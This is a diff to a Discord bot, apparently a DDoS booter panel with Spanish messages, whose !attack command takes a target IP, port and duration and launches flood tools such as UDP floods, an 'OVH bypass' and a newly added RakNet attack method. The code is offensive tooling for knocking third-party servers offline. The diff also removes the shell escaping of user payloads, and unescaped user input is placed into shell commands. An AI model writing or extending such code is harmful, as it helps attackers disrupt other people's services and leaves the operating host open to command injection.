@@ -43,7 +43,7 @@ async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
 @bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
 async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
     if metodo is None or ip is None or port is None or tiempo is None:
-        await ctx.send("!attack {method} {ip} {port} {time}")
+        await ctx.send("Uso: !attack {method} {ip} {port} {time}")
         return
 
     if ip == "null" or port == "null" or tiempo == "null":
@@ -94,24 +94,20 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
             await ctx.send("Payload maximo 250 bytes")
             return
         
-        # Escapar comillas para bash
-        payload_escaped = payload.replace('"', '\\"').replace('$', '\\$').replace('`', '\\`')
-        
-        # Guardar payload en archivo temporal
         import tempfile
-        import os
         with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
             f.write(payload)
             temp_file = f.name
         
-        # El binario C leerá el archivo
         comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
-        
-        # Mostrar info breve
         await ctx.send(f'Successful Attack UDPPayload TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int} Payload:{len(payload)}')
     
+    elif metodo == 'raknet':
+        comando = f'go run raknet.go {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack RakNet TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+    
     else:
-        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh, udppayload')
+        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh, udppayload, raknet')
         return
 
     try:
@@ -123,12 +119,13 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
 async def show_methods(ctx):
     methods_info = """
 **Métodos disponibles:**
-• **udp** - UDPFlood, consumo mayor de cpu
+• **udp** - UDPFlood
 • **udphex** - UDPHEX
-• **udppps** - UDPpps, the best power
-• **udpflood** - udpflood con threads
-• **ovh** - OVH bypass (TCP raw sockets)
-• **udppayload** - payload personalizable (max 250bytes)
+• **udppps** - UDPpps
+• **udpflood** - UDPFlood Go
+• **ovh** - OVH bypass
+• **udppayload** - Payload personalizable
+• **raknet** - RakNet attack
 """
     await ctx.send(methods_info)
 
